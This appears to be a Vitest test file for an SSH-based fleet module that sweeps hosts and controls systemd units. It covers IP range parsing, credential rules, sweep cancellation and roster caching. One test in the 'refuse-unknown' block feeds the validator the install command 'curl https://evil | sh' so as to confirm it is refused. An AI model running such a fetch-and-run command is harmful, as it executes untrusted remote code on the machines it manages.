import { describe, expect, it, vi } from 'vitest'
import { moduleHarness, sharedModuleConfig } from '../helpers/module-harness'
import { withFakeClock } from '../helpers/fake-clock'
import activateServiceFleet from '../../service-fleet/main/index'
import { Actions, parsePairKey } from '../../service-fleet/main/actions'
import { ConfigStore, resolveCredential, type TargetRule } from '../../service-fleet/main/config'
import { WatchedEditor } from '../../service-fleet/main/editors'
import { classifyReach } from '../../service-fleet/main/fanout'
import { packageFor } from '../../service-fleet/main/install'
import { enumerateRule, matchesGlob, parseRange } from '../../service-fleet/main/net'
import { DEFAULT_RULES } from '../../service-fleet/main/rules'
import {
  canControl,
  isUnitAction,
  isValidUnit,
  parseSteps,
  parseSweep,
  sweepCompleted,
  unitCommand,
  type HostFacts
} from '../../service-fleet/main/units'
import type { FleetJobs } from '../../service-fleet/main/jobs'
import { Roster } from '../../service-fleet/main/roster'
import { HostStore } from '../../service-fleet/main/store'
import { probeJumpHost } from '../../service-fleet/main/probe'
import type { Sweeper } from '../../service-fleet/main/sweep'

function rule(partial: Partial<TargetRule> & Pick<TargetRule, 'id' | 'kind' | 'value'>): TargetRule {
  return {
    enabled: true,
    port: 22,
    username: 'root',
    auth: 'agent',
    sudo: 'none',
    excludes: [],
    createdAt: 0,
    ...partial
  }
}

function facts(partial: Partial<HostFacts> = {}): HostFacts {
  return {
    hostname: 'lab',
    os: 'Debian',
    systemd: true,
    uid: 1000,
    pkg: 'apt-get',
    kernel: '6.1',
    uptimeSec: 1,
    sudoNoPassword: false,
    units: [],
    watched: [],
    truncated: false,
    ...partial
  }
}

describe('net helpers', () => {
  it('enumerates a /24 from .1, marks truncation, and keeps a /32', () => {
    const block = enumerateRule('cidr', '10.0.0.0/24', 10)
    expect(block.total).toBe(254)
    expect(block.truncated).toBe(true)
    expect(block.ips[0]).toBe('10.0.0.1')
    expect(block.ips).toHaveLength(10)
    expect(enumerateRule('cidr', '10.0.0.8/32', 10)).toEqual({
      ips: ['10.0.0.8'],
      total: 1,
      truncated: false,
      problem: null
    })
    expect(enumerateRule('host', '999.1.1.1', 10).problem).toMatch(/not an IPv4/)
  })

  it('parses a short range and rejects a reversed one', () => {
    const range = parseRange('10.0.0.10-40')
    expect(range).toEqual({ from: 10 * 256 ** 3 + 10, to: 10 * 256 ** 3 + 40 })
    expect(parseRange('10.0.0.40-10')).toBeNull()
  })

  it('treats an empty glob as match-all', () => {
    expect(matchesGlob('', ['10.0.0.1'])).toBe(true)
    expect(matchesGlob('10.0.0.*,lab', ['10.0.0.5'])).toBe(true)
    expect(matchesGlob('10.0.0.*,lab', ['other', 'lab'])).toBe(true)
    expect(matchesGlob('a?', ['ab'])).toBe(true)
    expect(matchesGlob('a?', ['abc'])).toBe(false)
  })
})

describe('units', () => {
  it('accepts a real unit name and the eight actions', () => {
    expect(isValidUnit('nginx.service')).toBe(true)
    expect(isValidUnit('nginx')).toBe(false)
    expect(isValidUnit('../../x.service')).toBe(false)
    expect(isUnitAction('restart')).toBe(true)
    expect(isUnitAction('kill')).toBe(false)
  })

  it('parses a framed sweep and notices a missing END marker', () => {
    const stdout = [
      '===ID===',
      'host=lab',
      'os=Debian 12',
      'init=systemd',
      'uid=0',
      'pkg=apt-get',
      'kernel=6.1',
      'uptime=12.9',
      'sudo=yes',
      '===UNITS===',
      'nginx.service loaded active running Nginx',
      'sshd.service loaded active running OpenSSH',
      '===WATCHED===',
      'Id=nginx.service',
      'LoadState=loaded',
      'ActiveState=active',
      'SubState=running',
      '===END==='
    ].join('\n')
    const parsed = parseSweep(stdout, 1)
    expect(parsed.hostname).toBe('lab')
    expect(parsed.systemd).toBe(true)
    expect(parsed.uid).toBe(0)
    expect(parsed.sudoNoPassword).toBe(true)
    expect(parsed.units).toHaveLength(1)
    expect(parsed.truncated).toBe(true)
    expect(parsed.watched[0]?.unit).toBe('nginx.service')
    expect(sweepCompleted(stdout)).toBe(true)
    expect(sweepCompleted('===ID===\nhost=x\n')).toBe(false)
  })

  it('parses framed steps including a failing rc', () => {
    const steps = parseSteps(
      [
        '===BMSTEP===',
        'name=start',
        'rc=0',
        '===BMSAY===',
        'ok',
        '===BMSTEP===',
        'name=reload',
        'rc=1',
        '===BMSAY===',
        'failed'
      ].join('\n')
    )
    expect(steps).toEqual([
      { name: 'start', rc: 0, say: 'ok' },
      { name: 'reload', rc: 1, say: 'failed' }
    ])
  })

  it('adds --now only for enable/disable/mask', () => {
    expect(unitCommand('enable', 'nginx.service')).toContain('enable --now')
    expect(unitCommand('start', 'nginx.service')).toBe("systemctl start 'nginx.service'")
  })

  it('decides control from uid, sudo-n and a stored sudo password', () => {
    expect(canControl(facts({ uid: 0 }), 'none')).toBe(true)
    expect(canControl(facts({ sudoNoPassword: true }), 'sudo-n')).toBe(true)
    expect(canControl(facts({ sudoNoPassword: false }), 'sudo-n')).toBe(false)
    expect(canControl(facts({ uid: 1000 }), 'sudo-password')).toBe(true)
    expect(canControl(facts({ uid: 1000 }), 'none')).toBe(false)
    expect(canControl(null, 'sudo-password')).toBe(false)
  })
})

describe('credentials and reach', () => {
  it('picks the narrowest enabled covering rule', () => {
    const wide = rule({ id: 'net', kind: 'cidr', value: '10.0.0.0/24', username: 'wide' })
    const host = rule({ id: 'one', kind: 'host', value: '10.0.0.8', username: 'narrow' })
    const disabled = rule({
      id: 'off',
      kind: 'host',
      value: '10.0.0.8',
      username: 'off',
      enabled: false
    })
    expect(resolveCredential('10.0.0.8', [wide, host, disabled])?.id).toBe('one')
    expect(resolveCredential('10.0.0.9', [wide, host])?.id).toBe('net')
    const excluded = rule({
      id: 'ex',
      kind: 'cidr',
      value: '10.0.0.0/24',
      excludes: ['10.0.0.8']
    })
    expect(resolveCredential('10.0.0.8', [excluded])).toBeNull()
  })

  it('classifies ssh reach from rc and stderr', () => {
    expect(classifyReach({ ip: '1', rc: 0, stdout: '', stderr: '' })).toBe('ok')
    expect(classifyReach({ ip: '1', rc: 1, stdout: '', stderr: 'Permission denied' })).toBe('auth')
    expect(classifyReach({ ip: '1', rc: 1, stdout: '', stderr: 'Host key verification failed' })).toBe(
      'hostkey'
    )
    expect(classifyReach({ ip: '1', rc: 124, stdout: '', stderr: '' })).toBe('timeout')
    expect(classifyReach({ ip: '1', rc: 5, stdout: '', stderr: '' })).toBe('auth')
  })
})

describe('refuse-unknown', () => {
  it('rejects a pair key whose unit is not a unit name', () => {
    expect(parsePairKey('10.0.0.1|not-a-unit')).toBeNull()
    expect(parsePairKey('10.0.0.1|nginx.service')).toEqual({ ip: '10.0.0.1', unit: 'nginx.service' })
  })

  it('refuses every host action except reboot', async () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }))
    const actions = new Actions(
      harness.ctx,
      {} as Roster,
      {} as FleetJobs,
      {} as Sweeper,
      { config: () => ({ version: 1, targets: [], watched: [], rules: {} }), rules: () => DEFAULT_RULES }
    )
    await expect(actions.hostAction('10.0.0.1', 'shutdown')).resolves.toEqual({
      ok: false,
      error: '"shutdown" is not a machine action'
    })
    expect(harness.exec).not.toHaveBeenCalled()
  })

  it('refuses an install command that fetches over HTTP', () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }))
    const editor = new WatchedEditor(harness.ctx, new ConfigStore(harness.ctx), {
      records: () => ({})
    } as Roster)
    const report = editor.check(null, {
      unit: 'x',
      installCommand: 'curl https://evil | sh'
    })
    expect(report.ok).toBe(false)
    expect(report.findings.some((f) => f.label.includes('may not fetch from a URL'))).toBe(true)
  })

  it('maps apt-get to the apt package name', () => {
    expect(packageFor('apt=docker.io,dnf=moby-engine', 'apt')).toBe('docker.io')
    expect(packageFor('apt=docker.io,dnf=moby-engine', 'zypper')).toBeNull()
  })
})

describe('config shared by every connected machine', () => {
  it('does not let one instance drop an edit made through another, or made by hand', () => {
    const file = sharedModuleConfig(null)
    const a = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }), { config: file })
    const b = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }), { config: file })
    const storeA = new ConfigStore(a.ctx)
    const storeB = new ConfigStore(b.ctx)

    storeA.update((config) => {
      config.targets.push(rule({ id: 't1', kind: 'host', value: '10.0.0.5' }))
    })
    // B never wrote anything, so a cache that only refreshed on B's own write
    // would still show an empty list here.
    expect(storeB.read().targets.map((t) => t.id)).toEqual(['t1'])

    storeB.update((config) => {
      config.watched.push({
        id: 'w1',
        unit: 'docker.service',
        severity: 'normal',
        enableOnInstall: true,
        startOnInstall: true
      })
    })

    // Both edits survive in the one file - B's write must not have thrown
    // away A's target by writing back a copy from before it existed.
    expect(storeA.read().targets.map((t) => t.id)).toEqual(['t1'])
    expect(storeA.read().watched.map((w) => w.id)).toEqual(['w1'])

    // A hand-edit to the file (no ctx.configSet involved at all) is visible
    // on the next read too, since nothing is cached in between.
    file.set({ version: 1, targets: [], watched: [], rules: {} })
    expect(storeA.read().targets).toEqual([])
  })
})

describe('primary election for the automatic sweep', () => {
  it('a non-primary instance runs neither the jump-host probe nor the sweep poller', () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }), {
      isPrimaryInstance: false
    })
    const lifecycle = activateServiceFleet(harness.ctx)
    lifecycle.applyPollers?.()
    expect(harness.exec).not.toHaveBeenCalled()
    expect(harness.pollers[0]?.start).not.toHaveBeenCalled()
  })

  it('the primary instance probes and starts the sweep poller at the slow interval', async () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }), {
      isPrimaryInstance: true
    })
    const lifecycle = activateServiceFleet(harness.ctx)
    lifecycle.applyPollers?.()
    await vi.waitFor(() => expect(harness.pollers[0]?.start).toHaveBeenCalledWith(60_000))
    expect(harness.exec).toHaveBeenCalled()
  })

  it('losing the election on a later applyPollers stops the poller and probes no further', async () => {
    const options: { isPrimaryInstance: boolean } = { isPrimaryInstance: true }
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }), options)
    const lifecycle = activateServiceFleet(harness.ctx)
    lifecycle.applyPollers?.()
    await vi.waitFor(() => expect(harness.pollers[0]?.start).toHaveBeenCalledTimes(1))

    options.isPrimaryInstance = false
    harness.exec.mockClear()
    lifecycle.applyPollers?.()

    expect(harness.pollers[0]?.stop).toHaveBeenCalled()
    expect(harness.pollers[0]?.start).toHaveBeenCalledTimes(1)
    expect(harness.exec).not.toHaveBeenCalled()
  })

  it('a second applyPollers call before the first capability probe resolves does not let the stale probe start the poller', async () => {
    let releaseFirstProbe: (() => void) | undefined
    const firstProbeGate = new Promise<void>((resolve) => {
      releaseFirstProbe = resolve
    })
    let calls = 0
    const options: { isPrimaryInstance: boolean } = { isPrimaryInstance: true }
    const harness = moduleHarness(
      'service-fleet',
      async () => {
        calls++
        if (calls === 1) await firstProbeGate
        return { stdout: '', stderr: '', code: 0 }
      },
      options
    )
    const lifecycle = activateServiceFleet(harness.ctx)

    // Starts probe #1 (still primary), which hangs on firstProbeGate.
    lifecycle.applyPollers?.()
    expect(calls).toBe(1)

    // The election flips before probe #1 comes back - a real overlap, not a
    // "call again after it already settled" like the test above.
    options.isPrimaryInstance = false
    lifecycle.applyPollers?.()
    expect(harness.pollers[0]?.stop).toHaveBeenCalled()

    releaseFirstProbe?.()
    await vi.waitFor(() => expect(harness.emit).toHaveBeenCalledWith('capabilities', expect.anything()))

    // Without the "still current" guard, probe #1 resolving after the second
    // call would start the poller anyway, on the interval decided when this
    // instance was still primary.
    expect(harness.pollers[0]?.start).not.toHaveBeenCalled()
  })
})

describe('probeJumpHost: a jump host missing `timeout`', () => {
  function toolsAnswer(overrides: Record<string, 'yes' | 'no'> = {}): { stdout: string; stderr: string; code: number } {
    const tools = { ssh: 'yes', sshpass: 'yes', xargs: 'yes', base64: 'yes', timeout: 'yes', mktemp: 'yes', nc: 'yes', ...overrides }
    const lines = ['===TOOLS===', ...Object.entries(tools).map(([t, v]) => `${t}=${v}`), '===VERSION===', 'OpenSSH_9.6']
    return { stdout: lines.join('\n'), stderr: '', code: 0 }
  }

  it('reports a warning, not a blocking problem, when timeout is the only thing missing', async () => {
    const harness = moduleHarness('service-fleet', () => toolsAnswer({ timeout: 'no' }))
    const capabilities = await probeJumpHost(harness.ctx)
    expect(capabilities.problem).toBeNull()
    expect(capabilities.warning).toContain('timeout')
  })

  it('still reports a blocking problem when something the fan-out script cannot run at all without is missing', async () => {
    const harness = moduleHarness('service-fleet', () => toolsAnswer({ ssh: 'no' }))
    const capabilities = await probeJumpHost(harness.ctx)
    expect(capabilities.problem).toContain('ssh')
    expect(capabilities.warning).toBeNull()
  })

  it('reports neither when every tool including timeout is present', async () => {
    const harness = moduleHarness('service-fleet', () => toolsAnswer())
    const capabilities = await probeJumpHost(harness.ctx)
    expect(capabilities.problem).toBeNull()
    expect(capabilities.warning).toBeNull()
  })

  it('sweeps normally instead of refusing, with only the missing-timeout warning reported', async () => {
    const harness = moduleHarness(
      'service-fleet',
      (command: string) =>
        command.includes('===TOOLS===')
          ? toolsAnswer({ timeout: 'no' })
          : { stdout: '===BMHOST===\n10.0.0.1\n===BMRC===\n0\n===BMOUT===\n\n===BMERR===\n\n', stderr: '', code: 0 },
      { isPrimaryInstance: true, config: sharedModuleConfig(null) }
    )
    activateServiceFleet(harness.ctx)
    const config = new ConfigStore(harness.ctx)
    config.update((c) => {
      c.targets.push(rule({ id: 't1', kind: 'host', value: '10.0.0.1' }))
    })

    const result = await harness.handlers.get('sweepNow')!()
    expect(result).toMatchObject({ ok: true })
    expect(harness.handlers.get('capabilities')!()).toMatchObject({
      problem: null,
      warning: expect.stringContaining('timeout')
    })
  })
})

describe('roster: an address that has never once answered', () => {
  it('reports null, not an epoch-zero duration, for lastSeen', () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }))
    const roster = new Roster(new HostStore(harness.ctx))
    roster.apply(
      [
        {
          ip: '10.0.0.9',
          cred: rule({ id: 't9', kind: 'host', value: '10.0.0.9' }),
          reach: 'unreachable',
          reachMessage: 'no answer',
          facts: null
        }
      ],
      [],
      DEFAULT_RULES
    )

    const row = roster.hostRows().find((r) => r.ip === '10.0.0.9')
    expect(row?.lastSeen).toBeNull()
    expect(roster.inspect('10.0.0.9')?.lastSeen).toBeNull()
    // Stamped on every sweep regardless of reach, so these stay real numbers.
    expect(roster.inspect('10.0.0.9')?.firstSeen).toEqual(expect.any(Number))
    expect(roster.inspect('10.0.0.9')?.lastProbeAt).toEqual(expect.any(Number))
  })
})

describe('sweep cancel', () => {
  const targets = ['10.0.1.1', '10.0.1.2', '10.0.1.3', '10.0.1.4', '10.0.1.5', '10.0.1.6']

  function ipsFromStdin(stdin: string | undefined): string[] {
    return Array.from((stdin ?? '').matchAll(/^H\t([^\t]+)\t/gm)).map((m) => m[1])
  }

  function framesFor(ips: string[], rc = 0): string {
    return ips.map((ip) => `===BMHOST===\n${ip}\n===BMRC===\n${rc}\n===BMOUT===\n\n===BMERR===\n\n`).join('')
  }

  it('keeps machines not yet reached by a cancelled sweep instead of dropping them from the wall', async () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }), {
      isPrimaryInstance: true,
      config: sharedModuleConfig(null)
    })
    activateServiceFleet(harness.ctx)
    const config = new ConfigStore(harness.ctx)
    config.update((c) => {
      c.rules.maxParallel = 1 // batch size 2, so 6 targets take 3 batches
      for (const ip of targets) c.targets.push(rule({ id: ip, kind: 'host', value: ip }))
    })

    let cancelOnNextBatch = false
    harness.exec.mockImplementation(async (command: string, options) => {
      // A real exec always involves genuine I/O, so its callers never observe
      // it settle in the same tick it was issued - `Sweeper.run()` relies on
      // that ordering to assign `inFlight` before any batch can come back.
      // Skipping this microtask hop here would make `sweepCancel` (below)
      // race that assignment purely as a test artifact.
      await Promise.resolve()
      if (command.includes('===TOOLS===')) {
        return { stdout: '===TOOLS===\nssh=yes\nsshpass=yes\nxargs=yes\nbase64=yes\ntimeout=yes\nmktemp=yes\nnc=yes\n===VERSION===\nOpenSSH_9\n', stderr: '', code: 0 }
      }
      const ips = ipsFromStdin(options?.stdin)
      if (cancelOnNextBatch) {
        cancelOnNextBatch = false
        harness.handlers.get('sweepCancel')!()
      }
      return { stdout: framesFor(ips), stderr: '', code: 0 }
    })

    // A full, uncancelled sweep first, so every address has already earned a card.
    await harness.handlers.get('sweepNow')!()
    expect(harness.handlers.get('hostRows')!()).toHaveLength(6)

    // Second sweep: cancel fires while answering the first batch, so the
    // other two batches (four addresses) never run at all.
    cancelOnNextBatch = true
    harness.exec.mockClear()
    await harness.handlers.get('sweepNow')!()
    expect(harness.exec).toHaveBeenCalledTimes(2) // probe + one batch, not all three

    const rows = harness.handlers.get('hostRows')!() as Array<{ ip: string }>
    expect(rows.map((r) => r.ip).sort()).toEqual([...targets].sort())

    const sweepEvents = harness.emit.mock.calls.filter((call) => call[0] === 'sweep')
    expect(sweepEvents.at(-1)?.[1]).toMatchObject({ state: 'cancelled' })
  })

  it('aborts the SSH batch already in flight instead of waiting for it to time out on its own', async () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }), {
      isPrimaryInstance: true,
      config: sharedModuleConfig(null)
    })
    activateServiceFleet(harness.ctx)
    const config = new ConfigStore(harness.ctx)
    config.update((c) => {
      c.targets.push(rule({ id: 't1', kind: 'host', value: '10.0.2.1' }), rule({ id: 't2', kind: 'host', value: '10.0.2.2' }))
    })

    let capturedSignal: AbortSignal | undefined
    harness.exec.mockImplementation((command: string, options) => {
      if (command.includes('===TOOLS===')) {
        return Promise.resolve({
          stdout: '===TOOLS===\nssh=yes\nsshpass=yes\nxargs=yes\nbase64=yes\ntimeout=yes\nmktemp=yes\nnc=yes\n===VERSION===\nOpenSSH_9\n',
          stderr: '',
          code: 0
        })
      }
      capturedSignal = options?.signal
      // A real executor resolves once the signal aborts (server/executors/ssh.ts,
      // local.ts) rather than rejecting or running to its own timeout.
      return new Promise((resolve) => {
        options?.signal?.addEventListener('abort', () => resolve({ stdout: '', stderr: '[cancelled]', code: 130 }), {
          once: true
        })
      })
    })

    const sweeping = harness.handlers.get('sweepNow')!()
    await vi.waitFor(() => expect(capturedSignal).toBeDefined())
    expect(capturedSignal?.aborted).toBe(false)

    harness.handlers.get('sweepCancel')!()
    expect(capturedSignal?.aborted).toBe(true)

    await sweeping
  })
})

describe('re-reading one machine', () => {
  const TOOLS =
    '===TOOLS===\nssh=yes\nsshpass=yes\nxargs=yes\nbase64=yes\ntimeout=yes\nmktemp=yes\nnc=yes\n===VERSION===\nOpenSSH_9\n'

  function ipsFromStdin(stdin: string | undefined): string[] {
    return Array.from((stdin ?? '').matchAll(/^H\t([^\t]+)\t/gm)).map((m) => m[1])
  }

  function framesFor(ips: string[], out = ''): string {
    return ips.map((ip) => `===BMHOST===\n${ip}\n===BMRC===\n0\n===BMOUT===\n${out}\n===BMERR===\n\n`).join('')
  }

  /**
   * modules-fleet-bmc#9: the Probe button fanned out to the machine, folded
   * the answer into the roster, and then called refreshOne() - which fanned
   * out to the same machine a second time purely to republish the wall. Two
   * SSH sessions, two sudo prompts' worth of work, for one answer.
   */
  it('opens one fan-out session, not two', async () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }), {
      config: sharedModuleConfig(null)
    })
    activateServiceFleet(harness.ctx)
    const config = new ConfigStore(harness.ctx)
    config.update((c) => {
      c.targets.push(rule({ id: 'h5', kind: 'host', value: '10.0.2.5' }))
    })

    const fanouts: string[][] = []
    harness.exec.mockImplementation(async (command: string, options) => {
      if (command.includes('===TOOLS===')) return { stdout: TOOLS, stderr: '', code: 0 }
      const ips = ipsFromStdin(options?.stdin)
      fanouts.push(ips)
      return { stdout: framesFor(ips), stderr: '', code: 0 }
    })

    await harness.handlers.get('hostProbe')!('10.0.2.5')

    expect(fanouts).toEqual([['10.0.2.5']])
    // The wall is still republished - that is what refreshOne was there for.
    expect(harness.emit.mock.calls.some(([event]) => event === 'hosts')).toBe(true)
  })
})

describe('roster: what counts as a change worth writing to disk', () => {
  function entry(ip: string, reach: 'ok' | 'unreachable' = 'ok'): Parameters<Roster['applyOne']>[0] {
    return {
      ip,
      cred: rule({ id: ip, kind: 'host', value: ip }),
      reach,
      reachMessage: reach === 'ok' ? 'ok' : 'no answer',
      facts: reach === 'ok' ? facts({ hostname: 'box' }) : null
    }
  }

  /**
   * modules-fleet-bmc#10: the comparison excluded lastProbeAt but not
   * lastSeen, and lastSeen is `now` on every sweep that reaches the machine -
   * so a fleet that is simply up meant a write per machine per sweep, which
   * is what the module rules say not to do.
   */
  it('does not write a machine whose only movement is lastSeen', async () => {
    await withFakeClock(1_000_000, async () => {
      const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }))
      const write = vi.spyOn(harness.ctx, 'hostDataSet')
      const roster = new Roster(new HostStore(harness.ctx))

      roster.applyOne(entry('10.0.3.1'), [], DEFAULT_RULES)
      expect(write).toHaveBeenCalledTimes(1) // the record itself is new

      vi.setSystemTime(1_120_000) // two minutes later, same machine, same facts
      roster.applyOne(entry('10.0.3.1'), [], DEFAULT_RULES)
      expect(write).toHaveBeenCalledTimes(1)

      // Something a person would notice still writes, and carries the current
      // lastSeen out with it.
      vi.setSystemTime(1_240_000)
      roster.applyOne(entry('10.0.3.1', 'unreachable'), [], DEFAULT_RULES)
      expect(write).toHaveBeenCalledTimes(2)

      // And dispose flushes whatever the sweeps left in memory.
      roster.flush()
      expect(write).toHaveBeenCalledTimes(3)
      expect(roster.hostRows()[0]?.lastSeen).toBe(1_120_000)
    })
  })

  /**
   * modules-fleet-bmc#11: both tables are invoked on the fast interval, and
   * every call rebuilt and re-sorted every row - tens of thousands of them for
   * a /24 running a hundred units each - for a roster that had not moved.
   */
  it('hands back the same rows until the roster actually changes', () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }))
    const roster = new Roster(new HostStore(harness.ctx))
    roster.applyOne(entry('10.0.4.1'), [], DEFAULT_RULES)

    const units = roster.unitRows()
    const hosts = roster.hostRows()
    expect(roster.unitRows()).toBe(units)
    expect(roster.hostRows()).toBe(hosts)

    roster.applyOne(entry('10.0.4.2'), [], DEFAULT_RULES)

    expect(roster.unitRows()).not.toBe(units)
    expect(roster.hostRows()).not.toBe(hosts)
    expect(roster.hostRows().map((row) => row.ip)).toEqual(['10.0.4.1', '10.0.4.2'])
  })
})
